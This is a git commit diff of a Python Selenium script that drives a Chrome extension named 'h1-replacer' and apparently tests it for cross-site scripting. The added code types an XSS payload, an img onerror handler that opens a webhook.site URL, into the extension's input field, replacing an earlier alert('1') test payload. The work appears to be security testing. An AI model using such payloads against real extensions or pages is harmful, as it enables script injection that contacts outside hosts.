75ebe2da363254b63ccf8fb3a2565f5c55115d49
showloser <ngweiming2004@gmail.com>
2023-06-07 01:27:54 +0800

    works

--- gui.py
+++ gui.py
@@ -11,57 +11,63 @@ import hashlib
 def gui():
     # getting id of extension [start]
     def get_ext_id():
-        abs_path = path.abspath("Extensions/h1-replacer/h1-replacer")
+        abs_path = path.abspath("h1-replacer")
         m = hashlib.sha256()
         m.update(abs_path.encode("utf-8"))
         ext_id = "".join([chr(int(i, base=16) + 97) for i in m.hexdigest()][:32])
         url_path = f"chrome-extension://{ext_id}/popup.html"
-        return url_path
+        return url_path, abs_path
 
+    url_path, abs_path = get_ext_id()
 
     options = webdriver.ChromeOptions()
     # prevent chrome browser from closing and define extension
     options.add_experimental_option('detach', True)
-    options.add_argument('--load-extension=Extensions/h1-replacer/h1-replacer')
+    load_ext_arg = "load-extension="+abs_path
+    options.add_argument(load_ext_arg)
+
     options.add_argument("--enable-logging")
     driver = webdriver.Chrome('./chromedriver', options=options)
 
+    # url_path = get_ext_id()
+
+    driver.get(url_path)
+    original = driver.current_window_handle
+
+    driver.switch_to.new_window('tab')
+
+    new = driver.current_window_handle
+
+    driver.get('https://www.example.com')
+
+    time.sleep(2)
+    driver.get_screenshot_as_file("ss.png")
+
+    driver.switch_to.window(original)
+
+    a = driver.find_element(By.ID,'replacementInput')
+
+    payload = '<img src=x onerror="window.open(`https://webhook.site/addca2be-52c9-4cee-8589-408277a63dda`)">'
+
+    a.send_keys(payload)
+
+    driver.get_screenshot_as_file("ss.png")
+
+    b = driver.find_element(By.ID, 'replaceButton')
 
     time.sleep(3)
 
-    # open chrome extension in browser
-    url_path = get_ext_id()
-    driver.get(url_path)
-
-    # # Use extension in context of www.example.com
-    # original = driver.current_window_handle
-    # driver.switch_to.new_window('tab')
-    # new = driver.current_window_handle
-    # driver.get('https://www.example.com')
-
-    # # switch back to extension context
-    # driver.switch_to.window(original)
-    # entry_point = driver.find_element(By.ID,'replacementInput')
-    # payload = '<img src=x onerror="alert("1")">'
-
-    # entry_point.send_keys(payload)
-    # driver.get_screenshot_as_file("ss.png")
-
-
-    # Switch to the frame where the extension is injected in the page
-    frame_locator = (By.ID, 'extension-frame')  # Replace 'extension-frame' with the actual frame locator
-    WebDriverWait(driver, 10).until(EC.frame_to_be_available_and_switch_to_it(frame_locator))
-
-    # Find the element within the frame
-    entry_point = driver.find_element(By.ID, 'replacementInput')  # Replace 'replacementInput' with the actual element ID
-
-    payload = '<img src=x onerror="alert("1")">'
-
-    entry_point.send_keys(payload)
     driver.get_screenshot_as_file("ss.png")
 
+    b.click()
+    
+    driver.switch_to.window(new)
+    time.sleep(1)
+    driver.get_screenshot_as_file("ss.png")
 
+    # driver.switch_to.window(original)
 
+    print(driver.page_source)
 
 
 gui()
